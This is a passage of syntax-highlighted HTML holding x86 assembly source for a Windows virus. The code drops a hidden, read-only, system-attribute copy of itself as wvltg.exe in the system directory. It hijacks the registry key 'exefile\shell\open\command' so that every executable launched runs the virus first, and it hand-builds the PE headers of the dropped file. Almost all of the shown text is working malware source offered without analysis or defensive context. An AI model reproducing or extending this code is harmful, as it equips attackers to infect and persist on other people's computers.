    </span><span class="sc5">VirusFile</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0ffh</span><span class="sc0">    </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">Buffer</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0ffh</span><span class="sc0">    </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">ExeHookerName</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"\wvltg.exe"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ExeHookKey</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"exefile\shell\open\command"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ExeHookerValue</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'"'</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">ExeHookerEndOfValue</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'" "%1" %*'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    
    </span><span class="sc5">GPTR</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0040h</span><span class="sc0">
    </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000080h</span><span class="sc0">
    </span><span class="sc5">FILE_ATTRIBUTE_READONLY</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000001h</span><span class="sc0">
    </span><span class="sc5">FILE_ATTRIBUTE_HIDDEN</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000002h</span><span class="sc0">
    </span><span class="sc5">FILE_ATTRIBUTE_SYSTEM</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000004h</span><span class="sc0">
    </span><span class="sc5">FILE_MAP_READ</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000004h</span><span class="sc0">
    </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc5">OPEN_ALWAYS</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc5">FILE_SHARE_READ</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000001h</span><span class="sc0">
    </span><span class="sc5">GENERIC_READ</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0">
    </span><span class="sc5">PAGE_READONLY</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000002h</span><span class="sc0">
    </span><span class="sc5">HKEY_CLASSES_ROOT</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0">
    </span><span class="sc5">HKEY_CURRENT_USER</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">80000001h</span><span class="sc0">
    </span><span class="sc5">REG_SZ</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1h</span><span class="sc0">
    </span><span class="sc5">KEY_WRITE</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00020006h</span><span class="sc0">
    </span><span class="sc5">KEY_READ</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00020019h</span><span class="sc0">
    </span><span class="sc5">KEY_QUERY_VALUE</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0001h</span><span class="sc0">
    </span><span class="sc5">ERROR_SUCCESS</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc5">hkey</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">FILE_CURRENT</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">



</span><span class="sc5">CreateVirusFile</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;create pe file that contain the pure virus code</span><span class="sc0">
</span><span class="sc1">;in the system directory under the name wvltg.exe</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_ATTRIBUTE_READONLY</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_HIDDEN</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_SYSTEM</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">OPEN_ALWAYS</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_SHARE_READ</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Buffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CreateFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">INVALID_HANDLE_VALUE</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">CVF_Fail</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hvdfile</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc1">;write virus headers</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">written_bytes</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SizeOfHeaders</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VirusHeaders</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hvdfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WriteFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc1">;set file pointer to offset 600h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_BEGIN</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">600h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hvdfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SetFilePointer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc1">;write the virus code there</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">written_bytes</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">VirusSize</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_main</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hvdfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WriteFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc1">;set file pointer to after (virus code + pad 200h)</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_BEGIN</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ImportSectionInFile</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hvdfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SetFilePointer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc1">;write import section:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">written_bytes</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SizeOfImportSection</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ImportSection</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hvdfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WriteFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc1">;align file size</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hvdfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GetFileSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">       </span><span class="sc1">;file alignment</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">no_pad</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">no_pad1</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_BEGIN</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hvdfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SetFilePointer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hvdfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SetEndOfFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hvdfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">CVF_Fail</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">




    </span><span class="sc5">written_bytes</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">hvdfile</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">;virus dropper file handle</span><span class="sc0">


    </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">    </span><span class="sc9">STRUC</span><span class="sc0">
        </span><span class="sc5">DD_VirtualAddress</span><span class="sc0">   </span><span class="sc9">DD</span><span class="sc0">    </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">DD_Size</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">    </span><span class="sc9">ENDS</span><span class="sc0">


</span><span class="sc5">VirusHeaders</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc1">;mz header &amp; dos stub program</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">04Dh</span><span class="sc4">,</span><span class="sc2">05Ah</span><span class="sc4">,</span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0"> 
    </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">0B8h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0"> 
    </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0"> 
    </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0"> 
    </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">00Eh</span><span class="sc4">,</span><span class="sc2">01Fh</span><span class="sc4">,</span><span class="sc2">0BAh</span><span class="sc4">,</span><span class="sc2">00Eh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0B4h</span><span class="sc4">,</span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc2">021h</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">04Ch</span><span class="sc4">,</span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc2">021h</span><span class="sc4">,</span><span class="sc2">054h</span><span class="sc4">,</span><span class="sc2">068h</span><span class="sc0"> 
    </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">070h</span><span class="sc4">,</span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc2">067h</span><span class="sc4">,</span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc2">06Dh</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">063h</span><span class="sc4">,</span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc2">06Fh</span><span class="sc0"> 
    </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc2">075h</span><span class="sc4">,</span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">044h</span><span class="sc4">,</span><span class="sc2">04Fh</span><span class="sc4">,</span><span class="sc2">053h</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">06Dh</span><span class="sc4">,</span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc2">064h</span><span class="sc4">,</span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc2">02Eh</span><span class="sc4">,</span><span class="sc2">00Dh</span><span class="sc4">,</span><span class="sc2">00Dh</span><span class="sc4">,</span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc2">024h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0"> 
    


    </span><span class="sc1">;pe header:</span><span class="sc0">
    
        </span><span class="sc5">PE_Magic</span><span class="sc0">            </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc2">00004550h</span><span class="sc0">
        </span><span class="sc5">Machine</span><span class="sc0">             </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">014ch</span><span class="sc0">
        </span><span class="sc5">NumberOfSections</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">2h</span><span class="sc0">
        </span><span class="sc5">TimeDateStamp</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc2">3878561Ah</span><span class="sc0">
        </span><span class="sc5">PointerToSymbolTable</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">NumberOfSymbols</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">SizeOfOptionalHeader</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc5">SizeOfPeOptionalHeader</span><span class="sc0">
        </span><span class="sc5">Characteristics</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">30Eh</span><span class="sc0">

</span><span class="sc5">Pe_OptionalHeader</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;pe optional header:</span><span class="sc0">
    
        </span><span class="sc5">OH_Magic</span><span class="sc0">                        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">010Bh</span><span class="sc0">
        </span><span class="sc5">OH_MajorLinkerVersion</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">05h</span><span class="sc0">
        </span><span class="sc5">OH_MinorLinkerVersion</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">OH_SizeOfCode</span><span class="sc0">                   </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">OH_SizeOfInitializedData</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">SizeOfImportSection</span><span class="sc4">+(</span><span class="sc2">200h</span><span class="sc4">-(</span><span class="sc5">SizeOfImportSection</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc4">)))</span><span class="sc0">
        </span><span class="sc5">OH_SizeOfUninitializedData</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">OH_AddressOfEntryPoint</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc2">1000h</span><span class="sc4">+</span><span class="sc5">Wvltg_EntryPoint</span><span class="sc4">-</span><span class="sc5">_main</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">;entry point!</span><span class="sc0">
        </span><span class="sc5">OH_BaseOfCode</span><span class="sc0">                   </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc2">1000h</span><span class="sc0">       </span><span class="sc1">;code placed at 1000h</span><span class="sc0">
        </span><span class="sc5">OH_BaseOfData</span><span class="sc0">                   </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc2">1000h</span><span class="sc4">+</span><span class="sc5">VirusSize</span><span class="sc4">+(</span><span class="sc2">1000h</span><span class="sc4">-(</span><span class="sc5">VirusSize</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc4">)))</span><span class="sc0"> </span><span class="sc1">;placed after code in the memory</span><span class="sc0">
        </span><span class="sc5">OH_ImageBase</span><span class="sc0">                    </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc2">400000h</span><span class="sc0">
        </span><span class="sc5">OH_SectionAlignment</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc2">1000h</span><span class="sc0">
        </span><span class="sc5">OH_FileAlignment</span><span class="sc0">                </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc5">OH_MajorOperatingSystemVersion</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0004h</span><span class="sc0">
        </span><span class="sc5">OH_MinorOperatingSystemVersion</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">OH_MajorImageVersion</span><span class="sc0">            </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">OH_MinorImageVersion</span><span class="sc0">            </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">OH_MajorSubsystemVersion</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0004h</span><span class="sc0">
        </span><span class="sc5">OH_MinorSubsystemVersion</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">OH_Win32VersionValue</span><span class="sc0">            </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;reserved1</span><span class="sc0">
